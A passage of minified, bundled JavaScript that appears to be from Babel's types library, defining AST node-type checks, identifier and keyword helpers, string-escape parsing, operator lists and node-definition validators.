yu(X,Q){if(!X)return!1;switch(X.type){case"DeclaredPredicate":case"InferredPredicate":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function gu(X,Q){if(!X)return!1;switch(X.type){case"EnumBooleanBody":case"EnumNumberBody":case"EnumStringBody":case"EnumSymbolBody":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function mu(X,Q){if(!X)return!1;switch(X.type){case"EnumBooleanMember":case"EnumNumberMember":case"EnumStringMember":case"EnumDefaultedMember":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function uu(X,Q){if(!X)return!1;switch(X.type){case"JSXAttribute":case"JSXClosingElement":case"JSXElement":case"JSXEmptyExpression":case"JSXExpressionContainer":case"JSXSpreadChild":case"JSXIdentifier":case"JSXMemberExpression":case"JSXNamespacedName":case"JSXOpeningElement":case"JSXSpreadAttribute":case"JSXText":case"JSXFragment":case"JSXOpeningFragment":case"JSXClosingFragment":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function cu(X,Q){if(!X)return!1;switch(X.type){case"Noop":case"Placeholder":case"V8IntrinsicIdentifier":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function lu(X,Q){if(!X)return!1;switch(X.type){case"TSParameterProperty":case"TSDeclareFunction":case"TSDeclareMethod":case"TSQualifiedName":case"TSCallSignatureDeclaration":case"TSConstructSignatureDeclaration":case"TSPropertySignature":case"TSMethodSignature":case"TSIndexSignature":case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSFunctionType":case"TSConstructorType":case"TSTypeReference":case"TSTypePredicate":case"TSTypeQuery":case"TSTypeLiteral":case"TSArrayType":case"TSTupleType":case"TSOptionalType":case"TSRestType":case"TSNamedTupleMember":case"TSUnionType":case"TSIntersectionType":case"TSConditionalType":case"TSInferType":case"TSParenthesizedType":case"TSTypeOperator":case"TSIndexedAccessType":case"TSMappedType":case"TSTemplateLiteralType":case"TSLiteralType":case"TSExpressionWithTypeArguments":case"TSInterfaceDeclaration":case"TSInterfaceBody":case"TSTypeAliasDeclaration":case"TSInstantiationExpression":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSEnumBody":case"TSEnumDeclaration":case"TSEnumMember":case"TSModuleDeclaration":case"TSModuleBlock":case"TSImportType":case"TSImportEqualsDeclaration":case"TSExternalModuleReference":case"TSNonNullExpression":case"TSExportAssignment":case"TSNamespaceExportDeclaration":case"TSTypeAnnotation":case"TSTypeParameterInstantiation":case"TSTypeParameterDeclaration":case"TSTypeParameter":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function pu(X,Q){if(!X)return!1;switch(X.type){case"TSCallSignatureDeclaration":case"TSConstructSignatureDeclaration":case"TSPropertySignature":case"TSMethodSignature":case"TSIndexSignature":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function du(X,Q){if(!X)return!1;switch(X.type){case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSFunctionType":case"TSConstructorType":case"TSTypeReference":case"TSTypePredicate":case"TSTypeQuery":case"TSTypeLiteral":case"TSArrayType":case"TSTupleType":case"TSOptionalType":case"TSRestType":case"TSUnionType":case"TSIntersectionType":case"TSConditionalType":case"TSInferType":case"TSParenthesizedType":case"TSTypeOperator":case"TSIndexedAccessType":case"TSMappedType":case"TSTemplateLiteralType":case"TSLiteralType":case"TSExpressionWithTypeArguments":case"TSImportType":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function iu(X,Q){if(!X)return!1;switch(X.type){case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSTemplateLiteralType":case"TSLiteralType":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function ru(X,Q){if((0,x4.default)("isNumberLiteral","isNumericLiteral"),!X)return!1;if(X.type!=="NumberLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function nu(X,Q){if((0,x4.default)("isRegexLiteral","isRegExpLiteral"),!X)return!1;if(X.type!=="RegexLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function au(X,Q){if((0,x4.default)("isRestProperty","isRestElement"),!X)return!1;if(X.type!=="RestProperty")return!1;return Q==null||(0,S.default)(X,Q)}function ou(X,Q){if((0,x4.default)("isSpreadProperty","isSpreadElement"),!X)return!1;if(X.type!=="SpreadProperty")return!1;return Q==null||(0,S.default)(X,Q)}function su(X,Q){return(0,x4.default)("isModuleDeclaration","isImportOrExportDeclaration"),LZ(X,Q)}});var uH=m((wZ)=>{Object.defineProperty(wZ,"__esModule",{value:!0});wZ.default=fr;var rX=d0();function NZ(X){return(0,rX.isMemberExpression)(X)||(0,rX.isMetaProperty)(X)}function fr(X,Q,J){if(!NZ(X))return!1;let Y=Array.isArray(Q)?Q:Q.split("."),W=[],G;for(G=X;NZ(G);G=(H=G.object)!=null?H:G.meta){var H;W.push(G.property)}if(W.push(G),W.length<Y.length)return!1;if(!J&&W.length>Y.length)return!1;for(let $=0,z=W.length-1;$<Y.length;$++,z--){let U=W[z],K;if((0,rX.isIdentifier)(U))K=U.name;else if((0,rX.isStringLiteral)(U))K=U.value;else if((0,rX.isThisExpression)(U))K="this";else if((0,rX.isSuper)(U))K="super";else if((0,rX.isPrivateName)(U))K="#"+U.id.name;else return!1;if(Y[$]!==K)return!1}return!0}});var cH=m((IZ)=>{Object.defineProperty(IZ,"__esModule",{value:!0});IZ.default=gr;var yr=uH();function gr(X,Q){let J=X.split(".");return(Y)=>(0,yr.default)(Y,J,Q)}});var SZ=m((CZ)=>{Object.defineProperty(CZ,"__esModule",{value:!0});CZ.default=void 0;var ur=cH(),cr=(0,ur.default)("React.Component"),U60=CZ.default=cr});var TZ=m((EZ)=>{Object.defineProperty(EZ,"__esModule",{value:!0});EZ.default=lr;function lr(X){return!!X&&/^[a-z]/.test(X)}});var WY=m((kZ)=>{Object.defineProperty(kZ,"__esModule",{value:!0});kZ.default=dr;var _Z=G6();function dr(X,Q){if(X===Q)return!0;if(X==null)return!1;if(_Z.ALIAS_KEYS[Q])return!1;let J=_Z.FLIPPED_ALIAS_KEYS[Q];if(J!=null&&J.includes(X))return!0;return!1}});var lH=m((bZ)=>{Object.defineProperty(bZ,"__esModule",{value:!0});bZ.default=nr;var rr=G6();function nr(X,Q){if(X===Q)return!0;let J=rr.PLACEHOLDERS_ALIAS[X];if(J!=null&&J.includes(Q))return!0;return!1}});var H5=m((vZ)=>{Object.defineProperty(vZ,"__esModule",{value:!0});vZ.default=Xn;var or=YY(),sr=WY(),tr=lH(),er=G6();function Xn(X,Q,J){if(!Q)return!1;if(!(0,sr.default)(Q.type,X)){if(!J&&Q.type==="Placeholder"&&X in er.FLIPPED_ALIAS_KEYS)return(0,tr.default)(Q.expectedNode,X);return!1}if(J===void 0)return!0;else return(0,or.default)(Q,J)}});var mZ=m((gZ)=>{Object.defineProperty(gZ,"__esModule",{value:!0});gZ.isIdentifierChar=yZ;gZ.isIdentifierName=Gn;gZ.isIdentifierStart=hZ;var dH="------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------",xZ="-----------------------------------------------------------------------------------------------------------------------------------------------------",Jn=new RegExp("["+dH+"]"),Yn=new RegExp("["+dH+xZ+"]");dH=xZ=null;var fZ=[0,11,2,25,2,18,2,1,2,14,3,13,35,122,70,52,268,28,4,48,48,31,14,29,6,37,11,29,3,35,5,7,2,4,43,157,19,35,5,35,5,39,9,51,13,10,2,14,2,6,2,1,2,10,2,14,2,6,2,1,4,51,13,310,10,21,11,7,25,5,2,41,2,8,70,5,3,0,2,43,2,1,4,0,3,22,11,22,10,30,66,18,2,1,11,21,11,25,71,55,7,1,65,0,16,3,2,2,2,28,43,28,4,28,36,7,2,27,28,53,11,21,11,18,14,17,111,72,56,50,14,50,14,35,39,27,10,22,251,41,7,1,17,2,60,28,11,0,9,21,43,17,47,20,28,22,13,52,58,1,3,0,14,44,33,24,27,35,30,0,3,0,9,34,4,0,13,47,15,3,22,0,2,0,36,17,2,24,20,1,64,6,2,0,2,3,2,14,2,9,8,46,39,7,3,1,3,21,2,6,2,1,2,4,4,0,19,0,13,4,31,9,2,0,3,0,2,37,2,0,26,0,2,0,45,52,19,3,21,2,31,47,21,1,2,0,185,46,42,3,37,47,21,0,60,42,14,0,72,26,38,6,186,43,117,63,32,7,3,0,3,7,2,1,2,23,16,0,2,0,95,7,3,38,17,0,2,0,29,0,11,39,8,0,22,0,12,45,20,0,19,72,200,32,32,8,2,36,18,0,50,29,113,6,2,1,2,37,22,0,26,5,2,1,2,31,15,0,328,18,16,0,2,12,2,33,125,0,80,921,103,110,18,195,2637,96,16,1071,18,5,26,3994,6,582,6842,29,1763,568,8,30,18,78,18,29,19,47,17,3,32,20,6,18,433,44,212,63,129,74,6,0,67,12,65,1,2,0,29,6135,9,1237,42,9,8936,3,2,6,2,1,2,290,16,0,30,2,3,0,15,3,9,395,2309,106,6,12,4,8,8,9,5991,84,2,70,2,1,3,0,3,1,3,3,2,11,2,0,2,6,2,64,2,3,3,7,2,6,2,27,2,3,2,4,2,0,4,6,2,339,3,24,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,7,1845,30,7,5,262,61,147,44,11,6,17,0,322,29,19,43,485,27,229,29,3,0,496,6,2,3,2,1,2,14,2,196,60,67,8,0,1205,3,2,26,2,1,2,0,3,0,2,9,2,3,2,0,2,0,7,0,5,0,2,0,2,0,2,2,2,1,2,0,3,0,2,0,2,0,2,0,2,0,2,1,2,0,3,3,2,6,2,3,2,3,2,0,2,9,2,16,6,2,2,4,2,16,4421,42719,33,4153,7,221,3,5761,15,7472,16,621,2467,541,1507,4938,6,4191],Wn=[509,0,227,0,150,4,294,9,1368,2,2,1,6,3,41,2,5,0,166,1,574,3,9,9,7,9,32,4,318,1,80,3,71,10,50,3,123,2,54,14,32,10,3,1,11,3,46,10,8,0,46,9,7,2,37,13,2,9,6,1,45,0,13,2,49,13,9,3,2,11,83,11,7,0,3,0,158,11,6,9,7,3,56,1,2,6,3,1,3,2,10,0,11,1,3,6,4,4,68,8,2,0,3,0,2,3,2,4,2,0,15,1,83,17,10,9,5,0,82,19,13,9,214,6,3,8,28,1,83,16,16,9,82,12,9,9,7,19,58,14,5,9,243,14,166,9,71,5,2,1,3,3,2,0,2,1,13,9,120,6,3,6,4,0,29,9,41,6,2,3,9,0,10,10,47,15,343,9,54,7,2,7,17,9,57,21,2,13,123,5,4,0,2,1,2,6,2,0,9,9,49,4,2,1,2,4,9,9,330,3,10,1,2,0,49,6,4,4,14,10,5350,0,7,14,11465,27,2343,9,87,9,39,4,60,6,26,9,535,9,470,0,2,54,8,3,82,0,12,1,19628,1,4178,9,519,45,3,22,543,4,4,5,9,7,3,6,31,3,149,2,1418,49,513,54,5,49,9,0,15,0,23,4,2,14,1361,6,2,16,3,6,2,1,2,4,101,0,161,6,10,9,357,0,62,13,499,13,245,1,2,9,726,6,110,6,6,9,4759,9,787719,239];function pH(X,Q){let J=65536;for(let Y=0,W=Q.length;Y<W;Y+=2){if(J+=Q[Y],J>X)return!1;if(J+=Q[Y+1],J>=X)return!0}return!1}function hZ(X){if(X<65)return X===36;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&Jn.test(String.fromCharCode(X));return pH(X,fZ)}function yZ(X){if(X<48)return X===36;if(X<58)return!0;if(X<65)return!1;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&Yn.test(String.fromCharCode(X));return pH(X,fZ)||pH(X,Wn)}function Gn(X){let Q=!0;for(let J=0;J<X.length;J++){let Y=X.charCodeAt(J);if((Y&64512)===55296&&J+1<X.length){let W=X.charCodeAt(++J);if((W&64512)===56320)Y=65536+((Y&1023)<<10)+(W&1023)}if(Q){if(Q=!1,!hZ(Y))return!1}else if(!yZ(Y))return!1}return!Q}});var dZ=m((pZ)=>{Object.defineProperty(pZ,"__esModule",{value:!0});pZ.isKeyword=qn;pZ.isReservedWord=uZ;pZ.isStrictBindOnlyReservedWord=lZ;pZ.isStrictBindReservedWord=Bn;pZ.isStrictReservedWord=cZ;var iH={keyword:["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete"],strict:["implements","interface","let","package","private","protected","public","static","yield"],strictBind:["eval","arguments"]},Un=new Set(iH.keyword),Kn=new Set(iH.strict),Vn=new Set(iH.strictBind);function uZ(X,Q){return Q&&X==="await"||X==="enum"}function cZ(X,Q){return uZ(X,Q)||Kn.has(X)}function lZ(X){return Vn.has(X)}function Bn(X,Q){return cZ(X,Q)||lZ(X)}function qn(X){return Un.has(X)}});var h4=m((a6)=>{Object.defineProperty(a6,"__esModule",{value:!0});Object.defineProperty(a6,"isIdentifierChar",{enumerable:!0,get:function(){return rH.isIdentifierChar}});Object.defineProperty(a6,"isIdentifierName",{enumerable:!0,get:function(){return rH.isIdentifierName}});Object.defineProperty(a6,"isIdentifierStart",{enumerable:!0,get:function(){return rH.isIdentifierStart}});Object.defineProperty(a6,"isKeyword",{enumerable:!0,get:function(){return f4.isKeyword}});Object.defineProperty(a6,"isReservedWord",{enumerable:!0,get:function(){return f4.isReservedWord}});Object.defineProperty(a6,"isStrictBindOnlyReservedWord",{enumerable:!0,get:function(){return f4.isStrictBindOnlyReservedWord}});Object.defineProperty(a6,"isStrictBindReservedWord",{enumerable:!0,get:function(){return f4.isStrictBindReservedWord}});Object.defineProperty(a6,"isStrictReservedWord",{enumerable:!0,get:function(){return f4.isStrictReservedWord}});var rH=mZ(),f4=dZ()});var $5=m((iZ)=>{Object.defineProperty(iZ,"__esModule",{value:!0});iZ.default=An;var nH=h4();function An(X,Q=!0){if(typeof X!=="string")return!1;if(Q){if((0,nH.isKeyword)(X)||(0,nH.isStrictReservedWord)(X,!0))return!1}return(0,nH.isIdentifierName)(X)}});var sZ=m((oZ)=>{Object.defineProperty(oZ,"__esModule",{value:!0});oZ.readCodePoint=aZ;oZ.readInt=nZ;oZ.readStringContents=Dn;var Ln=function(Q){return Q>=48&&Q<=57},rZ={decBinOct:new Set([46,66,69,79,95,98,101,111]),hex:new Set([46,88,95,120])},GY={bin:(X)=>X===48||X===49,oct:(X)=>X>=48&&X<=55,dec:(X)=>X>=48&&X<=57,hex:(X)=>X>=48&&X<=57||X>=65&&X<=70||X>=97&&X<=102};function Dn(X,Q,J,Y,W,G){let H=J,$=Y,z=W,U="",K=null,B=J,{length:q}=Q;for(;;){if(J>=q){G.unterminated(H,$,z),U+=Q.slice(B,J);break}let Z=Q.charCodeAt(J);if(Nn(X,Z,Q,J)){U+=Q.slice(B,J);break}if(Z===92){U+=Q.slice(B,J);let M=wn(Q,J,Y,W,X==="template",G);if(M.ch===null&&!K)K={pos:J,lineStart:Y,curLine:W};else U+=M.ch;({pos:J,lineStart:Y,curLine:W}=M),B=J}else if(Z===8232||Z===8233)++J,++W,Y=J;else if(Z===10||Z===13)if(X==="template"){if(U+=Q.slice(B,J)+`
`,++J,Z===13&&Q.charCodeAt(J)===10)++J;++W,B=Y=J}else G.unterminated(H,$,z);else++J}return{pos:J,str:U,firstInvalidLoc:K,lineStart:Y,curLine:W,containsInvalid:!!K}}function Nn(X,Q,J,Y){if(X==="template")return Q===96||Q===36&&J.charCodeAt(Y+1)===123;return Q===(X==="double"?34:39)}function wn(X,Q,J,Y,W,G){let H=!W;Q++;let $=(U)=>({pos:Q,ch:U,lineStart:J,curLine:Y}),z=X.charCodeAt(Q++);switch(z){case 110:return $(`
`);case 114:return $("\r");case 120:{let U;return{code:U,pos:Q}=aH(X,Q,J,Y,2,!1,H,G),$(U===null?null:String.fromCharCode(U))}case 117:{let U;return{code:U,pos:Q}=aZ(X,Q,J,Y,H,G),$(U===null?null:String.fromCodePoint(U))}case 116:return $("\t");case 98:return $("\b");case 118:return $("\v");case 102:return $("\f");case 13:if(X.charCodeAt(Q)===10)++Q;case 10:J=Q,++Y;case 8232:case 8233:return $("");case 56:case 57:if(W)return $(null);else G.strictNumericEscape(Q-1,J,Y);default:if(z>=48&&z<=55){let U=Q-1,B=/^[0-7]+/.exec(X.slice(U,Q+2))[0],q=parseInt(B,8);if(q>255)B=B.slice(0,-1),q=parseInt(B,8);Q+=B.length-1;let Z=X.charCodeAt(Q);if(B!=="0"||Z===56||Z===57)if(W)return $(null);else G.strictNumericEscape(U,J,Y);return $(String.fromCharCode(q))}return $(String.fromCharCode(z))}}function aH(X,Q,J,Y,W,G,H,$){let z=Q,U;if({n:U,pos:Q}=nZ(X,Q,J,Y,16,W,G,!1,$,!H),U===null)if(H)$.invalidEscapeSequence(z,J,Y);else Q=z-1;return{code:U,pos:Q}}function nZ(X,Q,J,Y,W,G,H,$,z,U){let K=Q,B=W===16?rZ.hex:rZ.decBinOct,q=W===16?GY.hex:W===10?GY.dec:W===8?GY.oct:GY.bin,Z=!1,M=0;for(let L=0,R=G==null?1/0:G;L<R;++L){let j=X.charCodeAt(Q),F;if(j===95&&$!=="bail"){let A=X.charCodeAt(Q-1),O=X.charCodeAt(Q+1);if(!$){if(U)return{n:null,pos:Q};z.numericSeparatorInEscapeSequence(Q,J,Y)}else if(Number.isNaN(O)||!q(O)||B.has(A)||B.has(O)){if(U)return{n:null,pos:Q};z.unexpectedNumericSeparator(Q,J,Y)}++Q;continue}if(j>=97)F=j-97+10;else if(j>=65)F=j-65+10;else if(Ln(j))F=j-48;else F=1/0;if(F>=W)if(F<=9&&U)return{n:null,pos:Q};else if(F<=9&&z.invalidDigit(Q,J,Y,W))F=0;else if(H)F=0,Z=!0;else break;++Q,M=M*W+F}if(Q===K||G!=null&&Q-K!==G||Z)return{n:null,pos:Q};return{n:M,pos:Q}}function aZ(X,Q,J,Y,W,G){let H=X.charCodeAt(Q),$;if(H===123){if(++Q,{code:$,pos:Q}=aH(X,Q,J,Y,X.indexOf("}",Q)-Q,!0,W,G),++Q,$!==null&&$>1114111)if(W)G.invalidCodePoint(Q,J,Y);else return{code:null,pos:Q}}else({code:$,pos:Q}=aH(X,Q,J,Y,4,!1,W,G));return{code:$,pos:Q}}});var z5=m((eZ)=>{Object.defineProperty(eZ,"__esModule",{value:!0});eZ.UPDATE_OPERATORS=eZ.UNARY_OPERATORS=eZ.STRING_UNARY_OPERATORS=eZ.STATEMENT_OR_BLOCK_KEYS=eZ.NUMBER_UNARY_OPERATORS=eZ.NUMBER_BINARY_OPERATORS=eZ.LOGICAL_OPERATORS=eZ.INHERIT_KEYS=eZ.FOR_INIT_KEYS=eZ.FLATTENABLE_KEYS=eZ.EQUALITY_BINARY_OPERATORS=eZ.COMPARISON_BINARY_OPERATORS=eZ.COMMENT_KEYS=eZ.BOOLEAN_UNARY_OPERATORS=eZ.BOOLEAN_NUMBER_BINARY_OPERATORS=eZ.BOOLEAN_BINARY_OPERATORS=eZ.BINARY_OPERATORS=eZ.ASSIGNMENT_OPERATORS=void 0;var R60=eZ.STATEMENT_OR_BLOCK_KEYS=["consequent","body","alternate"],L60=eZ.FLATTENABLE_KEYS=["body","expressions"],D60=eZ.FOR_INIT_KEYS=["left","init"],N60=eZ.COMMENT_KEYS=["leadingComments","trailingComments","innerComments"],Sn=eZ.LOGICAL_OPERATORS=["||","&&","??"],w60=eZ.UPDATE_OPERATORS=["++","--"],En=eZ.BOOLEAN_NUMBER_BINARY_OPERATORS=[">","<",">=","<="],Tn=eZ.EQUALITY_BINARY_OPERATORS=["==","===","!=","!=="],_n=eZ.COMPARISON_BINARY_OPERATORS=[...Tn,"in","instanceof"],kn=eZ.BOOLEAN_BINARY_OPERATORS=[..._n,...En],tZ=eZ.NUMBER_BINARY_OPERATORS=["-","/","%","*","**","&","|",">>",">>>","<<","^"],I60=eZ.BINARY_OPERATORS=["+",...tZ,...kn,"|>"],C60=eZ.ASSIGNMENT_OPERATORS=["=","+=",...tZ.map((X)=>X+"="),...Sn.map((X)=>X+"=")],bn=eZ.BOOLEAN_UNARY_OPERATORS=["delete","!"],vn=eZ.NUMBER_UNARY_OPERATORS=["+","-","~"],xn=eZ.STRING_UNARY_OPERATORS=["typeof"],P60=eZ.UNARY_OPERATORS=["void","throw",...bn,...vn,...xn],S60=eZ.INHERIT_KEYS={optional:["typeAnnotation","typeParameters","returnType"],force:["start","loc","end"]};eZ.BLOCK_SCOPED_SYMBOL=Symbol.for("var used to be block scoped"),eZ.NOT_LOCAL_BINDING=Symbol.for("should not be considered a local binding")});var o6=m(($3)=>{Object.defineProperty($3,"__esModule",{value:!0});$3.allExpandedTypes=$3.VISITOR_KEYS=$3.NODE_PARENT_VALIDATIONS=$3.NODE_FIELDS=$3.FLIPPED_ALIAS_KEYS=$3.DEPRECATED_KEYS=$3.BUILDER_KEYS=$3.ALIAS_KEYS=void 0;$3.arrayOf=J3;$3.arrayOfType=Y3;$3.assertEach=W3;$3.assertNodeOrValueType=Ba;$3.assertNodeType=$Y;$3.assertOneOf=Ka;$3.assertOptionalChainStart=Za;$3.assertShape=qa;$3.assertValueType=eH;$3.chain=G3;$3.default=H3;$3.defineAliasedType=Fa;$3.validate=tH;$3.validateArrayOfType=Ua;$3.validateOptional=$a;$3.validateOptionalType=za;$3.validateType=Ha;var Q3=H5(),y4=zY(),Xa=$3.VISITOR_KEYS={},Qa=$3.ALIAS_KEYS={},oH=$3.FLIPPED_ALIAS_KEYS={},Ja=$3.NODE_FIELDS={},Ya=$3.BUILDER_KEYS={},Wa=$3.DEPRECATED_KEYS={},Ga=$3.NODE_PARENT_VALIDATIONS={};function HY(X){if(Array.isArray(X))return"array";else if(X===null)return"null";else return typeof X}function tH(X){return{validate:X}}function Ha(...X){return tH($Y(...X))}function $a(X){return{validate:X,optional:!0}}function za(...X){return{validate:$Y(...X),optional:!0}}function J3(X){return G3(eH("array"),W3(X))}function Y3(...X){return J3($Y(...X))}function Ua(...X){return tH(Y3(...X))}function W3(X){let Q=process.env.BABEL_TYPES_8_BREAKING?y4.validateChild:()=>{};function J(Y,W,G){if(!Array.isArray(G))return;let H=0,$={toString(){return`${W}[${H}]`}};for(;H<G.length;H++){let z=G[H];X(Y,$,z),Q(Y,$,z)}}return J.each=X,J}function Ka(...X){function Q(J,Y,W){if(!X.includes(W))throw TypeError(`Property ${Y} expected value to be one of ${JSON.stringify(X)} but got ${JSON.stringify(W)}`)}return Q.oneOf=X,Q}var Va=$3.allExpandedTypes=[];function $Y(...X){let Q=new Set;Va.push({types:X,set:Q});function J(Y,W,G){let H=G==null?void 0:G.type;if(H!=null){if(Q.has(H)){(0,y4.validateChild)(Y,W,G);return}if(H==="Placeholder"){for(let $ of X)if((0,Q3.default)($,G)){(0,y4.validateChild)(Y,W,G);return}}}throw TypeError(`Property ${W} of ${Y.type} expected node to be of a type ${JSON.stringify(X)} but instead got ${JSON.stringify(H)}`)}return J.oneOfNodeTypes=X,J}function Ba(...X){function Q(J,Y,W){let G=HY(W);for(let H of X)if(G===H||(0,Q3.default)(H,W)){(0,y4.validateChild)(J,Y,W);return}throw TypeError(`Property ${Y} of ${J.type} expected node to be of a type ${JSON.stringify(X)} but instead got ${JSON.stringify(W==null?void 0:W.type)}`)}return Q.oneOfNodeOrValueTypes=X,Q}function eH(X){function Q(J,Y,W){if(HY(W)===X)return;throw TypeError(`Property ${Y} expected type of ${X} but got ${HY(W)}`)}return Q.type=X,Q}function qa(X){let Q=Object.keys(X);function J(Y,W,G){let H=[];for(let $ of Q)try{(0,y4.validateField)(Y,$,G[$],X[$])}catch(z){if(z instanceof TypeError){H.push(z.message);continue}throw z}if(H.length)throw TypeError(`Property ${W} of ${Y.type} expected to have the following:
${H.join(`
`)}`)}return J.shapeOf=X,J}function Za(){function X(Q){var J;let Y=Q;while(Q){let{type:W}=Y;if(W==="OptionalCallExpression"){if(Y.optional)return;Y=Y.callee;continue}if(W==="OptionalMemberExpression"){if(Y.optional)return;Y=Y.object;continue}break}throw TypeError(`Non-optional ${Q.type} must chain from an optional OptionalMemberExpression or OptionalCallExpression. Found chain from ${(J=Y)==null?void 0:J.type}`)}return X}function G3(...X){function Q(...J){for(let Y of X)Y(...J)}if(Q.chainOf=X,X.length>=2&&"type"in X[0]&&X[0].type==="array"&&!("each"in X[1]))throw Error('An assertValueType("array") validator can only be followed by an assertEach(...) validator.');return Q}var Ma=new Set(["aliases","builder","deprecatedAlias","fields","inherits","visitor","validate"]),ja=new Set(["default","optional","deprecated","validate"]),sH={};function Fa(...X){return(Q,J={})=>{let Y=J.aliases;if(!Y){var W;if(J.inherits)Y=(W=sH[J.inherits].aliases)==null?void 0:W.slice();Y!=null||(Y=[]),J.aliases=Y}let G=X.filter((H)=>!Y.includes(H));Y.unshift(...G),H3(Q,J)}}function H3(X,Q={}){let J=Q.inherits&&sH[Q.inherits]||{},Y=Q.fields;if(!Y){if(Y={},J.fields){let $=Object.getOwnPropertyNames(J.fields);for(let z of $){let U=J.fields[z],K=U.default;if(Array.isArray(K)?K.length>0:K&&typeof K==="object")throw Error("field defaults can only be primitives or empty arrays currently");Y[z]={default:Array.isArray(K)?[]:K,optional:U.optional,deprecated:U.deprecated,validate:U.validate}}}}let W=Q.visitor||J.visitor||[],G=Q.aliases||J.aliases||[],H=Q.builder||J.builder||Q.visitor||[];for(let $ of Object.keys(Q))if(!Ma.has($))throw Error(`Unknown type option "${$}" on ${X}`);if(Q.deprecatedAlias)Wa[Q.deprecatedAlias]=X;for(let $ of W.concat(H))Y[$]=Y[$]||{};for(let $ of Object.keys(Y)){let z=Y[$];if(z.default!==void 0&&!H.includes($))z.optional=!0;if(z.default===void 0)z.default=null;else if(!z.validate&&z.default!=null)z.validate=eH(HY(z.default));for(let U of Object.keys(z))if(!ja.has(U))throw Error(`Unknown field key "${U}" on ${X}.${$}`)}if(Xa[X]=Q.visitor=W,Ya[X]=Q.builder=H,Ja[X]=Q.fields=Y,Qa[X]=Q.aliases=G,G.forEach(($)=>{oH[$]=oH[$]||[],oH[$].push(X)}),Q.validate)Ga[X]=Q.validate;sH[X]=Q}});var g4=m((V3)=>{Object.defineProperty(V3,"__esModule",{value:!0});V3.patternLikeCommon=V3.importAttributes=V3.functionTypeAnnotationCommon=V3.functionDeclarationCommon=V3.functionCommon=V3.classMethodOrPropertyCommon=V3.classMethodOrDeclareMethodCommon=void 0;var P9=H5(),ca=$5(),U3=h4(),la=sZ(),U5=z5(),T=o6(),Z1=(0,T.defineAliasedType)("Standardized");Z1("ArrayExpression",{fields:{elements:{validate:(0,T.arrayOf)((0,T.assertNodeOrValueType)("null","Expression","SpreadElement")),default:!process.env.BABEL_TYPES_8_BREAKING?[]:void 0}},visitor:["elements"],aliases:["Expression"]});Z1("AssignmentExpression",{fields:{operator:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertValueType)("string"):Object.assign(function(){let X=(0,T.assertOneOf)(...U5.ASSIGNMENT_OPERATORS),Q=(0,T.assertOneOf)("=");return function(J,Y,W){((0,P9.default)("Pattern",J.left)?Q:X)(J,Y,W)}}(),{oneOf:U5.ASSIGNMENT_OPERATORS})},left:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertNodeType)("LVal","OptionalMemberExpression"):(0,T.assertNodeType)("Identifier","MemberExpression","OptionalMemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:(0,T.assertNodeType)("Expression")}},builder:["operator","left","right"],visitor:["left","right"],aliases:["Expression"]});Z1("BinaryExpression",{builder:["operator","left","right"],fields:{operator:{validate:(0,T.assertOneOf)(...U5.BINARY_OPERATORS)},left:{validate:function(){let X=(0,T.assertNodeType)("Expression"),Q=(0,T.assertNodeType)("Expression","PrivateName");return Object.assign(function(Y,W,G){(Y.operator==="in"?Q:X)(Y,W,G)},{oneOfNodeTypes:["Expression","PrivateName"]})}()},right:{validate:(0,T.assertNodeType)("Expression")}},visitor:["left","right"],aliases:["Binary","Expression"]});Z1("InterpreterDirective",{builder:["value"],fields:{value:{validate:(0,T.assertValueType)("string")}}});Z1("Directive",{visitor:["value"],fields:{value:{validate:(0,T.assertNodeType)("DirectiveLiteral")}}});Z1("DirectiveLiteral",{builder:["value"],fields:{value:{validate:(0,T.assertValueType)("string")}}});Z1("BlockStatement",{builder:["body","directives"],visitor:["directives","body"],fields:{directives:{validate:(0,T.arrayOfType)("Directive"),default:[]},body:(0,T.validateArrayOfType)("Statement")},aliases:["Scopable","BlockParent","Block","Statement"]});Z1("BreakStatement",{visitor:["label"],fields:{label:{validate:(0,T.assertNodeType)("Identifier"),optional:!0}},aliases:["Statement","Terminatorless","CompletionStatement"]});Z1("CallExpression",{visitor:["callee","typeParameters","typeArguments","arguments"],builder:["callee","arguments"],aliases:["Expression"],fields:Object.assign({callee:{validate:(0,T.assertNodeType)("Expression","Super","V8IntrinsicIdentifier")},arguments:(0,T.validateArrayOfType)("Expression","SpreadElement","ArgumentPlaceholder"),typeArguments:{validate:(0,T.asse